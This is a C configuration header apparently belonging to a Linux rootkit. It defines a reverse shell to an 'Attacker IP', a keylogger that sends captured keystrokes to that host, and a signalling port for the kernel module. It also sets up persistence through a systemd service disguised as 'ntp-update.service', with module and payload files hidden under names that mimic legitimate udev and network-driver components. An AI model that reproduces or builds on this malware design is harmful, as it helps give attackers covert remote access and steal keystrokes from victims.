// config.h
#ifndef CONFIG_H
#define CONFIG_H

#ifdef DEBUG // -DDEBUG in Makefile
    #define PERROR(msg) perror(msg)
#else
    #define PERROR(msg) do {} while (0)
#endif

#ifdef DEBUG
#define DBG(...) printf(__VA_ARGS__)
#else
#define DBG(...) 
#endif

// Revese shell
#define REMOTE_IP "10.0.2.2"  // Attacker IP
#define REMOTE_PORT 4443        // Change this
#define RECONNECT_DELAY 10      // Seconds between reconnects

// Receiver helper
#define MOD_SIG_PORT 6677 // Port for signaling to rootkit
#define MOD_SIG_PAYLOAD 0xec4effc // rootkit_rec_signal_
#define PORT 9000
#define BUF_SIZE 4096
#define FOLDER_PATH "/tmp/.cache"
#define FILE_PATH FOLDER_PATH "/libudev.so"

// Persistency + remove_module
#define SERVICE_NAME "ntp-update.service"
#define SERVICE_FILE "/etc/systemd/system/" SERVICE_NAME
#define MODULE_NAME "rootkit_module"
#define MODULE_PATH "/lib/modules/%s/kernel/drivers/net/debug_netlinkx.ko" // Kernel module path
#define REC_FILE "/var/lib/.cache/udevd-sync"
#define REV_SHELL_FILE "/var/lib/.cache/libudev.so"

// Keylog sender
#define KEYLOG_PATH "/proc/keylog"
#define BUFFER_SIZE 8192
// Replace these with your actual server
#define KEYLOG_SERVER_IP REMOTE_IP
#define KEYLOG_PORT 4443

#endif // CONFIG_H
